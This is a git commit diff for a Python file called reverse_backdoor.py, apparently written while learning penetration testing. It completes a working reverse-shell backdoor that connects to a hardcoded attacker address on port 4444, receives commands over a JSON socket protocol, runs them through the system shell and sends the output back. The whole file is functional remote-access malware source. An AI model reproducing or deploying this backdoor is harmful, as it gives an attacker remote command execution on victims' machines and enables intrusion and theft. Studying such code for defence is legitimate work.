2e71e6edcb06ffce6172669cad6f9ab4cae914a6
SantiagoX86 <seansantiago@rocketmail.com>
2025-11-21 15:01:24 -0500

    implemented completely Python3 workable code and try/except for non-windows commands

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -2,21 +2,55 @@
 
 import socket
 import subprocess
+import json
 
 class Backdoor:
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # Implement this for version to be loaded to GitHub, or possibly implement a variable module to be imported
-        # kali_ip = input('What is the IP of the attacker machine? \n')
         self.connection.connect((ip, port))
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        # Send data transformed into type byte for socket.send
+        self.connection.send(json_data.encode())
+
+    def reliable_receive(self):
+        # Initialize empty string to which segments will be added
+        json_data = ""
+
+        while True:
+            try:
+                # Convert received data from type byte to type string
+                segment = self.connection.recv(1024).decode()
+                # Concatenate each segment of data
+                json_data += segment
+                # Attempt to parse JSON. If it's not yet complete, ValueError is raised.
+                return json.loads(json_data)
+            except ValueError:
+                # Continue receiving until entire JSON object arrives
+                continue
+
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        try:
+            execution = subprocess.check_output(command, shell=True)
+            return execution
+        except:
+            execution = 'That is not a valid Windows cl command, please enter a valid command'
+            return execution.encode()
+
 
     def run(self):
         while True:
-            command = self.connection.recv(1024)
-            command_result = self.execute_system_command(str(command)[2:-1])
-            self.connection.send(command_result)
+            command = self.reliable_receive()
+            if command[:4].lower() == 'exit':
+                self.connection.close()
+                exit()
+            command_result = self.execute_system_command(command)
 
-        connection.close()
+            # Convert command_result to string prior to sending data
+            self.reliable_send(command_result.decode(errors="ignore"))
+        self.connection.close()
+
+# Start backdoor
+my_backdoor = Backdoor("192.168.164.128", 4444)
+my_backdoor.run()
